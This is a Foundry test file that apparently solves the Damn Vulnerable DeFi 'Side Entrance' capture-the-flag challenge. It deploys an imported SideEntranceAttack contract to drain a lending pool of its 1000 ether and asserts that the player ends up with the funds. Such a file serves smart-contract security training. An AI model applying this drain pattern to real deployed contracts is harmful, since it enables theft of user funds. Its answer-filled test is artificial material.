// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { DamnValuableToken } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableToken.sol";
import { SideEntranceLenderPool, SideEntranceAttack } from "@contracts/CTF/Damn-Vulnerable-DeFi/04.Side-Entrance.sol";

/*
    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/04.Side-Entrance.t.sol -vvvvv
*/

contract Challenge_4_Side_Entrance_Test is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);

    SideEntranceLenderPool private pool;
    DamnValuableToken private token;
    uint256 private ETHER_IN_POOL = 1000 ether;
    uint256 private PLAYER_INITIAL_ETH_BALANCE = 1 ether;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, type(uint256).max);
        _before();
        vm.stopPrank();
        vm.startPrank(player);
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        token = new DamnValuableToken();
        pool = new SideEntranceLenderPool();
        vm.deal(deployer, type(uint256).max);
        pool.deposit{ value: ETHER_IN_POOL }();
        assertEq(address(pool).balance, ETHER_IN_POOL, "ETHER_IN_POOL");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(address(player).balance, PLAYER_INITIAL_ETH_BALANCE, "ETHER_IN_POOL");
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */
        SideEntranceAttack hackInst = new SideEntranceAttack(address(pool), player);
        // pool.deposit{ value: player.balance }();
        hackInst.attack();
        // burn extra token
        (bool isSuccess,) = address(0).call{ value: player.balance - ETHER_IN_POOL }("");
        require(isSuccess, "");
        /* END CODE YOUR SOLUTION */
        vm.stopPrank();
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.startPrank(deployer);
        assertEq(player.balance, ETHER_IN_POOL, "player");
        assertEq(address(pool).balance, 0, "pool");
        vm.stopPrank();
    }
}
